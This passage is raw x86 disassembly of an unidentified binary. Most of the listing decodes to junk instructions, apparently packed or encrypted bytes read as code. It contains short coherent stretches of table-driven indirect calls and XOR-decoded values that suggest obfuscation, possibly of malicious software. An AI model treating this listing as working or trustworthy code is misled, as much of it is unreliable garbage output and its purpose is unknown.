  407ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ac8:	sub    edx,DWORD PTR [edx+eiz*8+0x15]
  407acc:	pop    edi
  407acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ace:	mov    esp,0x307034a7
  407ad3:	rol    DWORD PTR [ecx],cl
  407ad5:	adc    DWORD PTR [ecx+0x25],esi
  407ad8:	fstp   TBYTE PTR gs:[eax+edi*2+0x23545594]
  407ae0:	xchg   edx,eax
  407ae1:	xor    ebx,ebp
  407ae3:	aas    
  407ae4:	jo     0x407b1c
  407ae6:	inc    esp
  407ae7:	cmp    al,al
  407ae9:	mov    dl,0x23
  407aeb:	and    BYTE PTR [edx+0x17d9717f],bl
  407af1:	mov    ebx,esp
  407af3:	xchg   ebp,eax
  407af4:	or     al,0x1a
  407af6:	mov    edx,0x73dad103
  407afb:	mov    dl,al
  407afd:	outs   dx,DWORD PTR ds:[esi]
  407afe:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b00:	test   DWORD PTR [eax+0x1ea13eca],ebx
  407b06:	dec    ecx
  407b07:	jnp    0x407b7c
  407b09:	ffree  st(1)
  407b0b:	pop    ss
  407b0c:	and    ah,al
  407b0e:	xchg   DWORD PTR [ecx+0x25],ecx
  407b11:	dec    ecx
  407b12:	adc    eax,DWORD PTR [ebp+0x3c63369]
  407b18:	(bad)  
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	dec    eax
  407b40:	ret    
  407b41:	sar    DWORD PTR [edi+edx*2+0x207070c9],1
  407b48:	jge    0x407bba
  407b4a:	jo     0x407b63
  407b4c:	jo     0x407b23
  407b4e:	push   es
  407b4f:	mov    WORD PTR [esi-0x2bdf45c3],ds
  407b55:	test   BYTE PTR [ecx+edi*2-0x2c],dh
  407b59:	add    dl,BYTE PTR [esi]
  407b5b:	outs   dx,BYTE PTR ds:[esi]
  407b5c:	loop   0x407bdb
  407b5e:	dec    esi
  407b5f:	xchg   edx,eax
  407b60:	push   esi
  407b61:	lods   eax,DWORD PTR ds:[esi]
  407b62:	dec    esi
  407b63:	mov    ds:0xf64582ae,eax
  407b68:	scas   eax,DWORD PTR es:[edi]
  407b69:	mov    esi,0xd5f6721
  407b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b6f:	retf   0x5fcd
  407b72:	in     eax,0xdf
  407b74:	les    ebx,FWORD PTR [ebx-0x10]
  407b77:	test   al,0xbe
  407b79:	and    eax,0x6a6178f6
  407b7e:	xchg   ebp,eax
  407b7f:	xor    eax,0x7694feeb
  407b84:	repz cmp al,0x9b
  407b87:	fs addr16 pop edi
  407b8a:	out    0xcf,al
  407b8c:	mov    ds:0x6c82520f,eax
  407b91:	push   ebp
  407b92:	sahf   
  407b93:	ret    
  407b94:	std    
  407b95:	and    esp,DWORD PTR [ecx]
  407b97:	mov    cl,0x7d
  407b99:	aad    0xa5
  407b9b:	repz into 
  407b9d:	ja     0x407bed
  407b9f:	test   BYTE PTR [edi+ebx*1+0x29],ch
  407ba3:	or     eax,0x3e146f08
  407ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ba9:	jb     0x407b4a
  407bab:	test   eax,0x5ea27a68
  407bb0:	push   esp
  407bb1:	retf   0x951b
  407bb4:	push   eax
  407bb5:	repz pop ss
  407bb7:	mov    esi,0x218f75bc
  407bbc:	(bad)  
  407bbd:	(bad)  
  407bbe:	cmc    
  407bbf:	and    edi,eax
  407bc1:	xor    eax,0x82d79a9c
  407bc6:	mov    al,ds:0xd5345873
  407bcb:	push   ds
  407bcc:	fadd   QWORD PTR [esi]
  407bce:	inc    ebp
  407bcf:	xchg   DWORD PTR [edi],esp
  407bd1:	fwait
  407bd2:	jp     0x407baa
  407bd4:	add    eax,0xc9349520
  407bd9:	and    al,0x94
  407bdb:	(bad)  
  407bdc:	xor    ebx,eax
  407bde:	mov    BYTE PTR [eax],ch
  407be0:	arpl   WORD PTR [ebp-0x419f6819],cx
  407be6:	adc    BYTE PTR [edi-0x5c],al
  407be9:	pop    es
  407bea:	rol    DWORD PTR [edi+0x578a1486],0xd7
  407bf1:	lods   eax,DWORD PTR ds:[esi]
  407bf2:	adc    eax,0x5e0f5dd6
  407bf7:	sub    edx,edx
  407bf9:	outs   dx,DWORD PTR ds:[esi]
  407bfa:	retf   
  407bfb:	test   BYTE PTR [esi-0x5b0e6a3d],ch
  407c01:	sbb    BYTE PTR [ebp+0x9],bh
  407c04:	das    
  407c05:	pop    esi
  407c06:	or     eax,0x59da80b8
  407c0b:	dec    edi
  407c0c:	dec    esp
  407c0d:	repz pop edx
  407c0f:	stc    
  407c10:	outs   dx,BYTE PTR ds:[esi]
  407c11:	xor    ah,ch
  407c13:	push   0xffffff9a
  407c15:	xchg   esp,eax
  407c16:	cmp    bh,dh
  407c18:	std    
  407c19:	add    esi,eax
  407c1b:	cmp    eax,0xcede4e97
  407c20:	and    bl,BYTE PTR [ebx-0x349aa12e]
  407c26:	pop    edi
  407c27:	jnp    0x407c4f
  407c29:	sub    dl,BYTE PTR [eax+0x57c0b19c]
  407c2f:	inc    edx
  407c30:	outs   dx,BYTE PTR ds:[esi]
  407c31:	stc    
  407c32:	imul   esi,DWORD PTR [esi],0xb
  407c35:	xchg   esi,eax
  407c36:	ficomp DWORD PTR [edx]
  407c38:	mov    ds:0xd3f08bb5,eax
  407c3d:	cmp    bl,BYTE PTR [esp+edx*8+0x52]
  407c41:	imul   ecx
  407c43:	popa   
  407c44:	mov    ds:0x78e37004,eax
  407c49:	mov    ds:0x1dacd745,eax
  407c4e:	inc    edx
  407c4f:	pop    ds
  407c50:	jmp    0x407c4b
  407c52:	popf   
  407c53:	repz call 0x31ec1751
  407c59:	cdq    
  407c5a:	pop    gs
  407c5c:	mov    esp,0x4a930fdd
  407c61:	dec    esp
  407c62:	xor    bl,cl
  407c64:	xchg   esp,eax
  407c65:	cwde   
  407c66:	adc    al,0xda
  407c68:	push   es
  407c69:	dec    ebp
  407c6a:	or     esi,eax
  407c6c:	fcomp  DWORD PTR [esi-0x2d5f51cb]
  407c72:	ret    0x3668
  407c75:	xchg   edx,eax
  407c76:	xor    ch,BYTE PTR [eax-0x3c8f2c51]
  407c7c:	nop
  407c7d:	cli    
  407c7e:	jge    0x407cba
  407c80:	out    dx,al
  407c81:	or     al,0xdd
  407c83:	es adc eax,0xe53bca84
  407c89:	mov    al,0x3f
  407c8b:	add    DWORD PTR ds:0xd2bf11a9,edi
  407c91:	mov    ds:0xb2921752,al
  407c96:	sub    eax,DWORD PTR [ebx+0x39]
  407c99:	push   ecx
  407c9a:	hlt    
  407c9b:	pop    esi
  407c9c:	int    0xe
  407c9e:	imul   edi,DWORD PTR [ebp+0x4aeee8ff],0xffffff8d
  407ca5:	int    0x21
  407ca7:	popa   
  407ca8:	dec    eax
  407ca9:	div    BYTE PTR [edx]
  407cab:	rcl    DWORD PTR [ebp+0xcdc201e],0x1b
  407cb2:	ss out 0xd8,al
  407cb5:	xor    BYTE PTR [ebx+ebx*1],bh
  407cb8:	das    
  407cb9:	cmp    esi,DWORD PTR [eiz*8-0x3074e69b]
  407cc0:	std    
  407cc1:	add    DWORD PTR [edi-0x4],ebx
  407cc4:	jb     0x407cce
  407cc6:	sub    ebx,edx
  407cc8:	pushf  
  407cc9:	daa    
  407cca:	out    0x62,eax
  407ccc:	pop    ecx
  407ccd:	stos   BYTE PTR es:[edi],al
  407cce:	fcomi  st,st(3)
  407cd0:	shr    DWORD PTR [edi-0x88d180a],1
  407cd6:	pop    esp
  407cd7:	pop    ds
  407cd8:	or     al,0x8
  407cda:	aad    0xb0
  407cdc:	sbb    DWORD PTR [edi+0x1f],ebp
  407cdf:	adc    eax,0xea06f43e
  407ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce5:	cmp    BYTE PTR [ebp+eiz*8+0x34],bl
  407ce9:	sahf   
  407cea:	cdq    
  407ceb:	mov    dh,0x93
  407ced:	call   0x8b3c:0xa628af9c
  407cf4:	sbb    DWORD PTR [esi+0x7d93154e],0x68
  407cfb:	sbb    bl,BYTE PTR ds:0xaa28f4e
  407d01:	add    eax,DWORD PTR [ebx-0x18fb134f]
  407d07:	push   edi
  407d08:	test   BYTE PTR [esi+ebp*1-0x782dd1eb],cl
  407d0f:	sub    BYTE PTR [ebx],dl
  407d11:	loopne 0x407cbc
  407d13:	fstp   QWORD PTR [ecx]
  407d15:	retf   0x4cce
  407d18:	mov    cl,0x60
  407d1a:	sub    BYTE PTR [ebx+eiz*1],dh
  407d1d:	jbe    0x407d36
  407d1f:	(bad)  [edi+0x1ec81228]
  407d25:	pop    edx
  407d26:	lock or eax,0x882f4cc8
  407d2c:	jl     0x407d31
  407d2e:	lods   eax,DWORD PTR ds:[esi]
  407d2f:	dec    ebp
  407d30:	xor    BYTE PTR [esi],ch
  407d32:	mov    al,ds:0x613e5b76
  407d37:	pop    ds
  407d38:	jmp    0xdd74a4d9
  407d3d:	or     ebp,0x6482bb3d
  407d43:	icebp  
  407d44:	call   0x808714a0
  407d49:	or     BYTE PTR [edi+0x49],cl
  407d4c:	ffree  st(0)
  407d4e:	jbe    0x407cfe
  407d50:	xchg   edx,eax
  407d51:	push   ds
  407d52:	adc    DWORD PTR [ebx-0x510ace71],ebx
  407d58:	jp     0x407ced
  407d5a:	add    bl,BYTE PTR [ebx-0x1f99cc81]
  407d60:	jo     0x407d60
  407d62:	pop    ebx
  407d63:	lods   al,BYTE PTR ds:[esi]
  407d64:	sbb    al,0x12
  407d66:	aad    0x9a
  407d68:	push   esi
  407d69:	ds hlt 
  407d6b:	lods   al,BYTE PTR ds:[esi]
  407d6c:	cmp    ecx,DWORD PTR [ecx]
  407d6e:	(bad)  
  407d6f:	jle    0x407d27
  407d71:	clc    
  407d72:	xor    al,0xab
  407d74:	xchg   esp,eax
  407d75:	fldenv [ecx+ecx*4-0x2f089468]
  407d7c:	mov    DWORD PTR [esi-0x32],edi
  407d7f:	repnz lds esp,FWORD PTR [ecx+0x37]
  407d83:	aad    0x78
  407d85:	cmp    dh,al
  407d87:	test   al,0x3e
  407d89:	outs   dx,DWORD PTR ds:[esi]
  407d8a:	int3   
  407d8b:	lods   al,BYTE PTR ds:[esi]
  407d8c:	in     al,dx
  407d8d:	pop    edx
  407d8e:	not    BYTE PTR [ebx+0x34a4be1]
  407d94:	mov    edi,0xf94cd9b3
  407d99:	std    
  407d9a:	pop    ebp
  407d9b:	mov    eax,ds:0x5681e2
  407da0:	imul   ebp,DWORD PTR [eax-0x14],0xffffffb2
  407da4:	and    eax,0xf24d5d26
  407da9:	fisttp WORD PTR [eax]
  407dab:	lods   eax,DWORD PTR ds:[esi]
  407dac:	aad    0x2e
  407dae:	int    0x16
  407db0:	stc    
  407db1:	scas   al,BYTE PTR es:[edi]
  407db2:	lahf   
  407db3:	lahf   
  407db4:	addr16 ja 0x407e0e
  407db7:	push   0xd58d9804
  407dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dbd:	dec    ebp
  407dbe:	fisttp QWORD PTR [edx+0x5311fd8f]
  407dc4:	addr16 ret 0x1b8e
  407dc8:	cmp    BYTE PTR [edx+ebp*1+0x45ab22c6],0x9f
  407dd0:	pop    esp
  407dd2:	ins    BYTE PTR es:[edi],dx
  407dd3:	jne    0x407e12
  407dd5:	out    0x5b,al
  407dd7:	fsubr  DWORD PTR [edi+0x548638e6]
  407ddd:	aas    
  407dde:	cmc    
  407ddf:	leave  
  407de0:	xor    al,0x90
  407de2:	in     al,dx
  407de3:	jb     0x407e28
  407de5:	fnstenv [edi+0x16]
  407de8:	jns    0x407dd0
  407dea:	push   ss
  407deb:	push   0xffffff84
  407ded:	add    BYTE PTR [ebx],dl
  407def:	(bad)  
  407df0:	pop    esp
  407df1:	xchg   esi,eax
  407df2:	sbb    ch,BYTE PTR [edi]
  407df4:	out    dx,eax
  407df5:	sub    al,0xbe
  407df7:	imul   ebx,esi,0xa
  407dfa:	int    0xff
  407dfc:	fdivr  QWORD PTR [ebx]
  407dfe:	cwde   
  407dff:	or     BYTE PTR [esi-0x4bfabfd0],cl
  407e05:	push   ecx
  407e06:	dec    ebx
  407e07:	pop    ebx
  407e08:	lahf   
  407e09:	dec    esp
  407e0a:	inc    ebx
  407e0b:	repz test BYTE PTR [eax],bh
  407e0e:	rol    DWORD PTR [edi-0x9],0xf5
  407e12:	jl     0x407e26
  407e14:	push   0x3a958e5c
  407e19:	xchg   BYTE PTR cs:[edx],ch
  407e1c:	push   es
  407e1d:	dec    ecx
  407e1e:	jl     0x407db2
  407e20:	pusha  
  407e21:	mov    esi,0x80dffbfc
  407e26:	jne    0x407de4
  407e28:	mov    ebx,0xd3ea43a4
  407e2d:	out    dx,eax
  407e2e:	neg    eax
  407e30:	bound  esp,QWORD PTR [ebx]
  407e32:	dec    edi
  407e33:	xchg   esp,eax
  407e34:	sub    DWORD PTR [eax+0x6144ac6b],edi
  407e3a:	(bad)  
  407e3b:	imul   edx,edx,0xffffffa9
  407e3e:	inc    ebx
  407e3f:	retf   
  407e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e41:	jno    0x407e29
  407e43:	xchg   edx,eax
  407e44:	out    0x12,eax
  407e46:	aam    0x59
  407e48:	pop    edi
  407e49:	jg     0x407e17
  407e4b:	iret   
  407e4c:	adc    DWORD PTR [eax],ebx
  407e4e:	mov    al,0x6b
  407e50:	mov    cl,0xcb
  407e52:	add    ah,BYTE PTR [ebx-0x59]
  407e55:	dec    DWORD PTR [edi]
  407e57:	(bad)
  407e5a:	cwde   
  407e5b:	cmc    
  407e5c:	scas   al,BYTE PTR es:[edi]
  407e5d:	fucomip st,st(1)
  407e5f:	push   eax
  407e60:	sub    eax,0x41534918
  407e65:	lods   eax,DWORD PTR ds:[esi]
  407e66:	pop    ss
  407e67:	xchg   esp,eax
  407e68:	ret    0x1b6f
  407e6b:	pop    ebp
  407e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e6d:	inc    edi
  407e6e:	push   esi
  407e6f:	xor    DWORD PTR [esi+0x7a38415c],esp
  407e75:	dec    ebp
  407e76:	or     eax,0xef6083e6
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	(bad)  
  407e99:	mov    esp,0xd507a7ca
  407e9e:	jo     0x407f10
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407e45
  407ea5:	jnp    0x407e36
  407ea7:	mov    dl,0xe
  407ea9:	xlat   BYTE PTR ds:[ebx]
  407eaa:	in     eax,dx
  407eab:	inc    ecx
  407eac:	imul   ebx,DWORD PTR [esi],0x9d24eb7f
  407eb2:	push   eax
  407eb3:	cmp    DWORD PTR [ecx-0x7d],ebx
  407eb6:	test   al,0x1b
  407eb8:	in     al,dx
  407eb9:	adc    BYTE PTR [eax+0x617ffd29],0xb0
  407ec0:	repz mov eax,ds:0x9b1d4481
  407ec6:	jns    0x407f3b
  407ec8:	sub    esi,DWORD PTR [ebx+eiz*4+0x344bddad]
  407ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed0:	loopne 0x407e8b
  407ed2:	inc    esi
  407ed3:	jae    0x407ea6
  407ed5:	hlt    
  407ed6:	inc    ebx
  407ed7:	mov    ebx,ss
  407ed9:	lods   al,BYTE PTR ds:[esi]
  407eda:	aas    
  407edb:	inc    ebx
  407edc:	dec    esi
  407edd:	mov    dl,0xeb
  407edf:	aas    
  407ee0:	xchg   esp,eax
  407ee1:	cmp    esp,ebp
  407ee3:	xchg   BYTE PTR [ecx],ah
  407ee5:	jge    0x407ebd
  407ee7:	add    BYTE PTR [ecx-0x879eccd],ah
  407eed:	dec    edx
  407eee:	sbb    al,0x1
  407ef0:	ret    
  407ef1:	out    0xbd,al
  407ef3:	loop   0x407f18
  407ef5:	push   eax
  407ef6:	outs   dx,DWORD PTR ds:[esi]
  407ef7:	jo     0x407f21
  407ef9:	pop    eax
  407efa:	sub    dh,al
  407efc:	aas    
  407efd:	push   ebp
  407efe:	mov    dl,0x49
  407f00:	rcr    bl,cl
  407f02:	xchg   esp,eax
  407f03:	sub    BYTE PTR [esi+edi*1],dl
  407f06:	stc    
  407f07:	add    DWORD PTR [edi+0x8c0954b],ebx
  407f0d:	retf   0x18d
  407f10:	adc    DWORD PTR [eax-0x19a869fa],0xbbdac40a
  407f1a:	cmp    DWORD PTR [eax+0x753cfcf0],edx
  407f20:	sub    edi,esp
  407f22:	loopne 0x407f5e
  407f24:	or     cl,BYTE PTR [edi+0x5769229]
  407f2a:	(bad)  
  407f2b:	fdiv   st,st(4)
  407f2d:	and    dl,bl
  407f2f:	adc    al,0xc5
  407f31:	jno    0x407f69
  407f33:	in     al,0xb7
  407f35:	cli    
  407f36:	rcr    edi,cl
  407f38:	stos   BYTE PTR es:[edi],al
  407f39:	sbb    ah,BYTE PTR [edi+0xc]
  407f3c:	inc    ebp
  407f3d:	out    0x5a,eax
  407f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f40:	not    DWORD PTR ds:0xfe0f4bb8
  407f46:	int3   
  407f47:	ror    BYTE PTR [ebp-0x48],1
  407f4a:	mov    dl,0x39
  407f4c:	ret    
  407f4d:	mov    ah,BYTE PTR [eax+0x531a2728]
  407f53:	repnz fstp QWORD PTR [esi-0x9]
  407f57:	out    dx,al
  407f58:	cld    
  407f59:	ins    BYTE PTR es:[edi],dx
  407f5a:	mov    ebp,0xc3622ac9
  407f5f:	mov    bh,0xe5
  407f61:	nop
  407f62:	loope  0x407fad
  407f64:	mov    fs,WORD PTR [edx]
  407f66:	add    DWORD PTR [ebx+0x5a9ce76b],esp
  407f6c:	fistp  QWORD PTR [ecx]
  407f6e:	icebp  
  407f6f:	inc    eax
  407f70:	sub    BYTE PTR [ecx+0x1a],cl
  407f73:	daa    
  407f74:	test   eax,0xb9973f45
  407f79:	pusha  
  407f7a:	daa    
  407f7b:	xor    eax,0x1791b38d
  407f80:	loope  0x407f7b
  407f82:	lods   eax,DWORD PTR ds:[esi]
  407f83:	xor    BYTE PTR [ebx-0x68df1015],dl
  407f89:	xor    dl,BYTE PTR [ebx+0x1c]
  407f8c:	sbb    ecx,DWORD PTR [ebx]
  407f8e:	sahf   
  407f8f:	xchg   edi,eax
  407f90:	stos   DWORD PTR es:[edi],eax
  407f91:	stc    
  407f92:	mov    ebx,ds
  407f94:	(bad)
  407f98:	(bad)  
  407f99:	jge    0x407fe7
  407f9b:	cmp    ebp,eax
  407f9d:	mov    edi,0x141edb56
  407fa2:	xor    BYTE PTR [eax],0xef
  407fa5:	add    BYTE PTR [ebx+0x10645d15],al
  407fab:	mov    ch,0xef
  407fad:	es test eax,0xa2b7e960
  407fb3:	inc    ecx
  407fb4:	std    
  407fb5:	std    
  407fb6:	or     DWORD PTR [ebx],0xe
  407fb9:	xchg   ecx,eax
  407fba:	or     BYTE PTR [ebx-0x1f90e282],ah
  407fc0:	jmp    DWORD PTR [edi]
  407fc2:	jecxz  0x407ffc
  407fc4:	xchg   ebp,eax
  407fc5:	pushf  
  407fc6:	fimul  WORD PTR [ecx]
  407fc8:	cmp    BYTE PTR [ebp+0x3e],ch
  407fcb:	(bad)  
  407fcc:	aad    0x4d
  407fce:	pushf  
  407fcf:	icebp  
  407fd0:	mov    ch,cl
  407fd2:	icebp  
  407fd3:	pushf  
  407fd4:	fimul  WORD PTR [ecx-0x42c042fc]
  407fda:	or     edi,ecx
  407fdc:	fisttp DWORD PTR [esi]
  407fde:	mov    cl,0x57
  407fe0:	retf   
  407fe1:	adc    BYTE PTR [ebx+0x44da5d75],bh
  407fe7:	(bad)  
  407fe8:	mov    dl,BYTE PTR [ecx+0x7]
  407feb:	cli    
  407fec:	mov    eax,ds:0x21829bd0
  407ff1:	jo     0x407fd9
  407ff3:	mov    WORD PTR [ecx+0x35ba7380],fs
  407ff9:	fstp   QWORD PTR [eax+0x44]
  407ffc:	xchg   esp,esp
  407ffe:	jge    0x408046
  408000:	repnz retf 0xd63e
  408004:	mov    al,ds:0x4918ab5
  408009:	mov    ds:0x3a8e818a,al
  40800e:	adc    DWORD PTR [ecx],edi
  408010:	stos   DWORD PTR es:[edi],eax
  408011:	fnstsw WORD PTR [edx-0x5705f3cf]
  408017:	ja     0x40805f
  408019:	mov    ebp,0x582484e3
  40801e:	sbb    eax,0xee3d15af
  408023:	dec    esi
  408024:	mov    es,WORD PTR [esi+0x63]
  408027:	bound  esi,QWORD PTR [ecx+0x5f843c78]
  40802d:	ins    BYTE PTR es:[edi],dx
  40802e:	xchg   ecx,eax
  40802f:	and    eax,0xedf7aa9e
  408034:	clc    
  408035:	and    eax,0x82fa6901
  40803a:	or     ebp,ebp
  40803c:	mov    BYTE PTR [ebx],ch
  40803e:	mov    al,0xce
  408040:	sbb    DWORD PTR [ebp+0x78],ebx
  408043:	pushf  
  408044:	or     BYTE PTR [ebp-0xe7cfab0],cl
  40804a:	cmp    al,BYTE PTR [ecx]
  40804c:	mov    ds:0xd7c98e9b,eax
  408051:	test   DWORD PTR [eax-0x1b],edx
  408054:	iret   
  408055:	sbb    BYTE PTR [ebx+eax*1],0x27
  408059:	(bad)  
  40805b:	add    BYTE PTR [ecx+0xb517b21],ah
  408061:	jne    0x40805c
  408063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408064:	pop    ebx
  408065:	add    DWORD PTR [ecx],esi
  408067:	add    cl,BYTE PTR [ecx+edi*8+0x61]
  40806b:	pushf  
  40806c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40806d:	or     eax,0x2982b793
  408072:	xchg   ecx,eax
  408073:	dec    ebx
  408074:	or     al,0x87
  408076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408077:	shl    cl,1
  408079:	in     eax,dx
  40807a:	dec    DWORD PTR [ecx+ebp*2-0x3]
  40807e:	push   esp
  40807f:	sub    al,0xe2
  408081:	sahf   
  408082:	stos   BYTE PTR es:[edi],al
  408083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408084:	push   esp
  408085:	cmp    BYTE PTR [esi+0x1b55af93],ch
  40808b:	and    DWORD PTR [edx+0x9],edi
  40808e:	aas    
  40808f:	loop   0x408094
  408091:	in     eax,0xc2
  408093:	or     ah,ch
  408095:	xor    DWORD PTR [ebx+eiz*1-0x46244810],eax
  40809c:	and    eax,edi
  40809e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40809f:	inc    ecx
  4080a0:	pop    es
  4080a1:	mov    ah,0x2f
  4080a3:	jns    0x408050
  4080a5:	jecxz  0x408044
  4080a7:	push   ds
  4080a8:	pop    edi
  4080a9:	addr16 sbb al,0xc9
  4080ad:	adc    ah,dl
  4080af:	or     bh,bl
  4080b1:	inc    eax
  4080b2:	stos   DWORD PTR es:[edi],eax
  4080b3:	dec    ecx
  4080b4:	mov    ebx,0x8a93ba64
  4080b9:	dec    eax
  4080ba:	aad    0x19
  4080bc:	dec    esp
  4080bd:	imul   eax,DWORD PTR [ecx-0x6313e224],0xaf3134f2
  4080c7:	sbb    al,0x31
  4080c9:	add    al,0x7c
  4080cb:	mov    esp,0x85e1fe2a
  4080d0:	in     al,dx
  4080d1:	pop    ecx
  4080d2:	inc    BYTE PTR [esi+0x64]
  4080d5:	mov    al,ds:0xcb12f147
  4080da:	cdq    
  4080db:	or     cl,dh
  4080dd:	enter  0xd37c,0xed
  4080e1:	mov    dl,0x68
  4080e3:	int    0x2e
  4080e5:	dec    edx
  4080e6:	xor    dl,BYTE PTR [ebp-0x74]
  4080e9:	dec    esp
  4080ea:	imul   ecx,ebx,0x579b1c81
  4080f0:	arpl   dx,si
  4080f2:	sbb    eax,edi
  4080f4:	pop    es
  4080f5:	pop    esi
  4080f6:	ss (bad) 
  4080f8:	sar    DWORD PTR [ecx+0x7bb15977],1
  4080fe:	imul   esi,edx,0x93b45e08
  408104:	push   0x7a
  408106:	sti    
  408107:	push   cs
  408108:	pop    ds
  408109:	(bad)  
  40810a:	scas   eax,DWORD PTR es:[edi]
  40810b:	in     al,dx
  40810c:	gs sbb eax,eax
  40810f:	and    al,0x87
  408111:	inc    esp
  408112:	arpl   WORD PTR [ebx+0x11],di
  408115:	enter  0xd47,0xf
  408119:	stos   BYTE PTR es:[edi],al
  40811a:	stos   BYTE PTR es:[edi],al
  40811b:	ins    DWORD PTR es:[edi],dx
  40811c:	cmc    
  40811d:	mov    dl,0x20
  40811f:	pop    es
  408120:	jg     0x40814c
  408122:	adc    BYTE PTR [ebx+0x3d1e5908],bl
  408128:	sub    edx,ebx
  40812a:	dec    esp
  40812b:	adc    eax,0xd0c8efe9
  408130:	push   eax
  408131:	mov    ebp,DWORD PTR [esi-0x6a0fccc]
  408137:	adc    DWORD PTR [esi+0x74],edx
  40813a:	pop    ds
  40813b:	test   eax,0x80fbca71
  408140:	sahf   
  408141:	dec    eax
  408142:	xchg   BYTE PTR [edi+ecx*2],bl
  408145:	adc    esp,esi
  408147:	mov    ah,0xb9
  408149:	pop    esi
  40814a:	daa    
  40814b:	popf   
  40814c:	jb     0x40813a
  40814e:	clc    
  40814f:	aaa    
  408150:	in     al,0x63
  408152:	pop    eax
  408153:	dec    ebp
  408154:	mov    esi,0xe6e4130e
  408159:	add    DWORD PTR [edi-0xb],esp
  40815c:	ja     0x4081b1
  40815e:	jae    0x408115
  408160:	xchg   ebx,eax
  408161:	xor    eax,0xc426c084
  408166:	pop    ebx
  408167:	push   0xfa23c31d
  40816c:	loopne 0x4081ab
  40816e:	push   ds
  40816f:	ja     0x4081ab
  408171:	cmc    
  408172:	pop    es
  408173:	loopne 0x40814d
  408175:	cmp    DWORD PTR [edx-0x7a3599af],0x31
  40817c:	cli    
  40817d:	inc    esp
  40817e:	jle    0x408141
  408180:	fcomp  QWORD PTR [eax+0x2d]
  408183:	cmp    dl,0x4f
  408186:	jl     0x408165
  408188:	xchg   BYTE PTR [ecx],dl
  40818a:	out    0xf0,al
  40818c:	in     al,dx
  40818d:	je     0x408170
  40818f:	lods   al,BYTE PTR ds:[esi]
  408190:	scas   al,BYTE PTR es:[edi]
  408191:	mov    dl,0xc8
  408193:	jg     0x4081e4
  408195:	test   esi,esp
  408197:	mov    ecx,edi
  408199:	daa    
  40819a:	pop    ebx
  40819b:	into   
  40819c:	adc    DWORD PTR [ebx+0x6638173a],edi
  4081a2:	int    0x26
  4081a4:	wbinvd 
  4081a6:	add    eax,0x52ea94c5
  4081ab:	xor    edx,DWORD PTR [ebp+0x30130ed6]
  4081b1:	sbb    eax,0x62aeeb69
  4081b6:	cli    
  4081b7:	js     0x4081fe
  4081b9:	dec    esp
  4081ba:	out    dx,al
  4081bb:	pop    ds
  4081bc:	(bad)  [edi+edx*2-0x5f]
  4081c0:	test   BYTE PTR [ecx+0x6c],0x4a
  4081c4:	jecxz  0x4081e4
  4081c6:	xor    BYTE PTR [edx],bl
  4081c8:	ja     0x4081e9
  4081ca:	cmp    DWORD PTR [ebx],esp
  4081cc:	jg     0x408235
  4081ce:	add    esi,esi
  4081d0:	(bad)  
  4081d1:	cmp    BYTE PTR [ebx+0x4],cl
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
